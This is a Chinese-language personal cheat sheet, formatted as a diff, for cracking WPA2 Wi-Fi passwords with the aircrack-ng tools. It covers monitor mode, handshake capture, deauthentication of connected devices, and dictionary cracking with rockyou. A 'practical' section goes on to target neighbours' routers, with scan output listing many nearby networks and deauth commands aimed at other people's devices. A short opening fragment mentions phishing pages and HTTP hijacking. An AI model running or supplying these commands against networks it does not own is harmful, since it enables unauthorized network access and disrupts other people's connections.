+这里是不会劫持 https网站的.只对http网站有效.
+
+
+
+👁‍🗨 最后的钓鱼界面. 
+1 有问题!!!
+2 netgear 可用.
+3 也可用..
+
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--字典破解----⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔵 airmon-ng               查看是否支持监控模式  
+🔵 airmon-ng start wlan0   开启监控模式. 现在用ifconfig 会发现 wlan0 变成 wlan0mon了.
+🔵 airodump-ng wlan0mon    查看周围wifi详细信息
+    ❗️ 记住要破解wifi的信道和BSSID (也就是路由器的Mac地址);   按Ctrl-C结束.
+
+🔵 airodump-ng -c 3 --bssid 6c:b0:ce:bd:d1:5b -w ~/ wlan0mon   选择一个wifi来抓握手包
+      -c      对方wifi 信道
+      --bssid 对方wiif bssid
+      -w      抓包数据的保存位置
+
+      Station 下面的就是连接的用户...  记住一个用户的mac地址.
+      用下面马上介绍的攻击命令来使得这个用户重新连接路由器. 这样就能快速获取握手包了.
+
+🔵 强制某设备重连路由器.
+    👁‍🗨 这里注意  要新开一个终端来执行下面命令.现在还不能停止上面的抓包...
+    aireplay-ng -0 2 -a 6c:b0:ce:bd:d1:5b -c dc:37:14:16:d2:79 wlan0mon
+      -0 表示发起攻击 
+       2 好像是攻击次数.不管.
+      -a 指定无线路由器BSSID
+      -c 指定强制断开的设备
+
+      这里如果你用这个命令攻击自己的手机. 
+      这时候去看手机就会发现wifi断开几秒 然后重连了.说明这个攻击命令有有效的.
+      手机重连后等几秒就能在 上一步的第一行就
+
+      ❗️❗️ 如果获取了握手包.
+      CH  6 ][ Elapsed: 3 mins ][ 2017-04-26 07:55
+      这行会变成类似... 多出个 handshake 来.这时候就说明抓到握手包了.可以停止抓包了.
+      CH  3 ][ Elapsed: 42 s ][ 2017-04-26 07:56 ][ WPA handshake: 6C:B0:CE:BD:D1:5B
+
+🔵 抓包文件
+    🔅 cd ~
+    🔅 ls -l
+        total 332
+        -rw-r--r-- 1 root root 293246 Apr 26 07:32 -01.cap
+        -rw-r--r-- 1 root root    568 Apr 26 07:32 -01.csv
+        -rw-r--r-- 1 root root    584 Apr 26 07:32 -01.kismet.csv
+        -rw-r--r-- 1 root root   3786 Apr 26 07:32 -01.kismet.netxml
+
+        好几个文件. 主要就是 .cap 文件.
+        每次抓包都会自动给你重命名. -01.cap ; -02.cap ; -03.cap... 等等.方便你区分.
+
+🔵 结束监听模式
+    airmon-ng stop wlan0mon
+
+🔵 准备字典
+
+    Kali Linux自带的rockyou字典:  cd /usr/share/wordlists/rockyou.txt.gz
+    解压后才能用：                gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+    cd /usr/share/wordlists/rockyou.txt
+    这文件很大的 11111111 88888888 都在里面.说明这个字典还是不错的.
+
+🔵 破解(VM Kali):
+
+    sudo aircrack-ng -a2 -b 6C:B0:CE:BD:D1:5B -w /usr/share/wordlists/rockyou.txt /root/-01.cap
+        -a2 不管.
+        -b 后面是 路由器Mac地址.
+        -w 后面是 字典路径
+        /root/-01.cap 是 .cap 文件路径
+
+🔵 破解(Mac): 复杂密码字典 (22万条.3MB大小文件. 真实密码在文件尾部.)
+    👁‍🗨 22万条密码.两分钟也就跑完了. 很快的. 重点是密码字典!!!
+    sudo aircrack-ng -w /Users/v/Desktop/dic/cain.txt -b 6c:b0:ce:bd:d1:5b /tmp/airportSniffCd2nGz.cap
+        -b 后面是 路由器Mac地址.
+        -w 后面是 字典路径
+
+
+
+❤️ 密码字典
+
+    重点的重点就是字典! 字典里面有对方密码. 就能找出那个密码.
+
+    好的密码字典一个，应包含常见的弱密码、手机号、姓名生日组合、各大网站泄露的密码、英语单词等等。
+    如果使用字典破解不了，说明密码还算复杂；暴力穷举更是费时费力。（论复杂密码的重要性）。
+
+    淘宝好像有跑字典服务???
+    用GPU跑字典. 快很多很多..
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️---字典破解实战---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+ 之前是自己的路由器来试验.下面来试试别人的路由器.
+ 用密码字典来暴力破解成功率最主要就是看你的字典. 还有就是对方密码复杂度..
+ 没事别用这个.... 成功率低!!!
+
+🔵 airmon-ng start wlan0   ➜ 进入监听模式 
+
+🔵 airodump-ng wlan0mon    ➜ Kali 查看周围 wifi
+
+    CH  1 ][ Elapsed: 12 s ][ 2017-04-26 07:48
+
+    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+    8C:A6:DF:DE:5E:0C  -84        2        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_5E0C
+    BC:5F:F6:0A:F6:68  -88        2        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_F668
+    1C:60:DE:AE:DB:BE  -90        1        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_DBBE302
+    F0:B4:29:21:07:A5  -90        2        0    0  11  54e  WPA2 CCMP   PSK  G-family
+    6C:B0:CE:BD:D1:5B  -27       14        0    0   3  54e  WPA2 CCMP   PSK  219
+    E4:F3:F5:83:CF:00  -67       12       10    0  12  54e  WPA2 CCMP   PSK  MERCURY_CF00
+    C8:3A:35:FD:E1:98  -69       14        0    0   9  54e  WPA2 CCMP   PSK  Tenda_FDE198
+    00:6B:8E:51:93:E4  -68        3        0    0   1  54e  WPA2 CCMP   PSK  PHICOMM_5193E4
+    E4:D3:32:B4:83:BC  -73       12        0    0  11  54e. WPA2 CCMP   PSK  MERCURY_210
+    30:FC:68:47:C0:42  -77        8        0    0  11  54e. WPA2 CCMP   PSK  顿�.��.海�.�
+    B8:F8:83:ED:CF:9B  -70       10        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_CF9B
+    18:44:E6:73:CA:CF  -75        9        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-VTka
+    CC:81:DA:12:0A:18  -72       11        0    0   4  54e  WPA2 CCMP   PSK  @PHICOMM_10
+    30:FC:68:3D:58:92  -75        8        0    0   6  54e. WPA2 CCMP   PSK  �.��..�.�.你�.�.�.�
+    14:75:90:08:4D:5E  -79        5        0    0   6  54e. WPA2 CCMP   PSK  lys
+    CC:2D:21:2F:FF:40  -79        7        0    0  11  54e  WPA2 CCMP   PSK  Tenda_2FFF40
+    42:FC:68:3D:58:92  -75        5        0    0   6  54e. WPA2 CCMP   PSK  �..�..你�.�.�.�.
+    00:6B:8E:E0:8F:58  -81        5        0    0   9  54e  WPA2 CCMP   PSK  MYY520MYY
+    E4:F3:F5:9A:EF:B0  -81        3        0    0  13  54e  WPA2 CCMP   PSK  MERCURY_EFB0
+    5C:63:BF:FE:8A:B8  -81        2        0    0   9  54e. WPA2 CCMP   PSK  ChinaNet-8AB8
+    D8:C8:E9:32:07:00  -81        5        0    0  13  54e. WPA2 CCMP   PSK  KEDU
+    D8:49:0B:A7:47:F0  -81        5        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-Ccfr
+    00:13:10:79:D4:9F  -77        6        0    0   6  54   WPA2 CCMP   PSK  linksys
+    00:19:D0:24:92:1B  -84        4        0    0   4  54e. WPA2 CCMP   PSK  ChinaNGB-Cactus
+    BC:46:99:C2:24:FC  -82        3        0    0   1  54e. WPA2 CCMP   PSK  HLZJ-807
+    BC:46:99:73:D9:DA  -82        3        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_D9DA
+    7C:08:D9:DB:2C:CA  -83        2        0    0   1  54e. WPA2 CCMP   PSK  ChinaNGB-602
+    74:C3:30:07:DD:FE  -83        3        1    0  13  54e  WPA2 CCMP   PSK  huatuoyangsheng
+    30:FC:68:8D:00:76  -83        1        0    0   1  54e. WPA2 CCMP   PSK  onshine
+    E0:28:61:81:FA:20  -87        2        0    0  11  54e  WPA2 CCMP   PSK  ChinaNet-UXjM
+    8C:F2:28:E1:D8:D6  -86        4        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_D8D6
+    08:3F:BC:B0:B1:ED  -86        2        0    0   4  54e  WPA2 CCMP   PSK  ChinaNet-V7Su
+    50:BD:5F:B5:01:C8  -87        2        0    0   1  54e. WPA2 CCMP   PSK  You Know Who 233
+    8C:A6:DF:DD:69:9C  -88        3        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_699C
+    54:BE:53:5A:B9:47  -87        2        0    0   5  54e  WPA2 CCMP   PSK  ChinaNet-6xkb
+    C8:3A:35:58:95:48  -88        2        0    0   8  54e  WPA2 CCMP   PSK  Tenda_589548
+    FC:10:C6:99:54:4B  -88        4        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-ZgbL
+    F4:B8:A7:6C:34:BC  -87        3        0    0   6  54e  WPA2 CCMP   PSK  ChinaNet-TA5N
+    30:D1:7E:AA:72:AC  -91        3        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-Ja2c
+    44:F4:36:5D:A2:6F  -91        1        0    0   8  54e  WPA2 CCMP   PSK  ChinaNet-jdwR
+    C8:3A:35:40:B9:08  -92        0        0    0   8  54e  WPA2 CCMP   PSK  Tenda_40B908
+
+
+
+    🔵 MERCURY_210    E4:D3:32:B4:83:BC  CH 11 👹 不在字典里....
+
+      🔸 抓包并查看连接设备:
+      airodump-ng -c 11 --bssid E4:D3:32:B4:83:BC -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c 74:E5:43:06:24:D2 wlan0mon
+      aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c C0:9F:05:FB:1F:A1 wlan0mon
+
+      🔸rockyou字典中无密码: ..
+      sudo aircrack-ng -a2 -b E4:D3:32:B4:83:BC -w /usr/share/wordlists/rockyou.txt /root/-15.cap
+
+
+    🔵 TP-LINK_CF9B B8:F8:83:ED:CF:9B  11    👹 不在字典里....
+
+    🔸 抓包并查看连接设备:
+        airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a B8:F8:83:ED:CF:9B -c 40:40:A7:B2:26:41 wlan0mon
+
+      🔸rockyou
+      sudo aircrack-ng -a2 -b B8:F8:83:ED:CF:9B -w /usr/share/wordlists/rockyou.txt /root/-21.cap
+
+
+    🔵 别看了，你连不上的 30:fc:68:3d:58:92  6  👹 不在字典中
+
+      airodump-ng -c 6 --bssid 30:fc:68:3d:58:92 -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a 30:FC:68:3D:58:92 -c 8C:18:D9:5B:A3:DB wlan0mon
+    
+      🔸rockyou字典
+      sudo aircrack-ng -a2 -b 30:fc:68:3d:58:92 -w /usr/share/wordlists/rockyou.txt /root/-17.cap
+
+
+
+    🔵 顿�.��.海�.�    30:FC:68:47:C0:42 6     👹 无握手包..
+
+    airodump-ng -c 6 --bssid 30:FC:68:47:C0:42 -w ~/ wlan0mon
+
+    🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c 54:4E:90:C2:97:C3 wlan0mon
+      aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c FC:1A:11:69:25:7E wlan0mon
+
+
+
+    🔵 MERCURY_EFB0   E4:F3:F5:9A:EF:B0 13    👹 无握手包..
+    airodump-ng -c 13 --bssid E4:F3:F5:9A:EF:B0 -w ~/ wlan0mon
+
+    🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c F4:8B:32:09:25:91 wlan0mon
+      aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c 6C:5C:14:DD:5F:DB wlan0mon
+
+
+    🔵 再看你也连不上 42:fc:68:3d:58:92  6  👹 无握手包...
+      airodump-ng -c 6 --bssid 42:FC:68:3D:58:92 -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a 42:FC:68:3D:58:92 -c 18:21:95:E6:35:D5 wlan0mon
+
+
+    🔵 ChinaNet-VTka   18:44:E6:73:CA:CF  2     👹 无连接设备
+      airodump-ng -c 6 --bssid 18:44:E6:73:CA:CF -w ~/ wlan0mon
+
+
+    🔵 MERCURY_CF00   E4:F3:F5:83:CF:00  CH 12   👹 无握手包...
+
+    🔸 抓包并查看连接设备:
+      airodump-ng -c 12 --bssid E4:F3:F5:83:CF:00 -w ~/ wlan0mon
+
+    🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a E4:F3:F5:83:CF:00 -c A8:7C:01:77:77:27 wlan0mon
+
+
+    🔵 Tenda_FDE198 C8:3A:35:FD:E1:98    11    👹 无握手包.....
+
+      airodump-ng -c 11 --bssid C8:3A:35:FD:E1:98 -w ~/ wlan0mon
+
+      aireplay-ng -0 20 -a C8:3A:35:FD:E1:98 -c FC:E9:98:1F:B2:F1 wlan0mon
+
+
+    🔵 TP-LINK_CF9B   B8:F8:83:ED:CF:9B  11     👹 无握手包..
+      airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon
+
+    aireplay-ng -0 20 -a B8:F8:83:ED:CF:9B -c B0:89:00:A3:CA:27 wlan0mon
+
+
+
+    🔵 TP-LINK_5E0C  ❌        8C:A6:DF:DE:5E:0C  CH 6
+
+      🔸 抓包并查看连接设备:
+      airodump-ng -c 6 --bssid 8C:A6:DF:DE:5E:0C -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a 8C:A6:DF:DE:5E:0C -c 1C:77:F6:65:35:0C wlan0mon
+
+
+
+
+    🔵 MERCURY_F668 ❌     BC:5F:F6:0A:F6:68  CH 6
+
+      🔸 抓包并查看连接设备:
+      airodump-ng -c 6 --bssid BC:5F:F6:0A:F6:68 -w ~/ wlan0mon
+
+      🔸 新开终端: 重启对方设备..
+      aireplay-ng -0 2 -a BC:5F:F6:0A:F6:68 -c 78:02:F8:AE:07:4B wlan0mon
+
+      也没有抓到握手包...
+
+
+    🔵 MERCURY_DBBE302 ❌   1C:60:DE:AE:DB:BE  CH6
+
+      🔸 抓包并查看连接设备:
+      airodump-ng -c 6 --bssid 1C:60:DE:AE:DB:BE -w ~/ wlan0mon
+      .... 没设备连接...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
